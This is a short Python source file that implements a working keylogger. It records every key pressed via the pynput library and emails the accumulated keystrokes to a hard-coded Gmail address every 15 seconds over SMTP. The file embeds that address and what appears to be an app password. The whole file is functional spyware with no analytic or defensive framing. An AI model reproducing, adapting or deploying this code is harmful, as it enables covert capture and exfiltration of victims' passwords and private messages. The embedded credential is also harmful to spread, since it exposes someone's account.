from pynput.keyboard import Listener
import smtplib
import threading

log = ""

EMAIL = "karthikajaagu@gmail.com"
PASSWORD = "ulsd ywud lpvt sqzp"

def write_to_file(key):
    global log
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift_l':
        letter = ''
    elif letter == 'Key.ctrl_l' or letter == 'Key.ctrl_r':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'

    log+=letter

def send_email():
    global log
    if log:
        try:
            #Connect to Gmail’s SMTP server on port 587
            server = smtplib.SMTP("smtp.gmail.com", 587)
            #Start a secure encrypted connection 
            server.starttls()
            #Log into your Gmail account using your email and password
            server.login(EMAIL, PASSWORD)
            server.sendmail(EMAIL, EMAIL, log)
            #Sends an email from your email address to the same email address containing the keystrokes stored in log
            server.quit()
        except Exception as e:
            print("Error sending email:", e)
        log = ""
    # Schedule next email
    threading.Timer(15, send_email).start()
    
# Start sending emails every 15 seconds
send_email()

   
"""
def write_to_log_file():
    global log
    if log:
        with open("log.txt", "a") as f:
            f.write(log)
        log = ""
    threading.Timer(15, write_to_log_file).start()
"""

with Listener(on_press=write_to_file) as l:
    l.join()